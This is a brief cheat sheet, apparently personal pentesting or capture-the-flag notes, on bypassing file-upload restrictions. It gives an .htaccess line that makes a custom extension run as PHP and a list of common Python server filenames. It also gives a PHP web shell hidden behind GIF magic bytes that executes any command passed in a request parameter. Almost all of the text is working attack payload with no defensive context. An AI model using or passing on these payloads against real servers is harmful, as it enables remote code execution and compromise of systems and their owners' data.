# Upload ".htaccess" file to exploit bypass
```bash
# cat .htaccess
AddType application/x-httpd-php .php16
```
---
# python web server
```bash
main.py
app.py
server.py
run.py
wsgi.py
asgi.py
```
---
# magic bytes file upload
```bash
# cat ex.php
GIF89a;
<?php system($_REQUEST['cmd']) ;?>
```
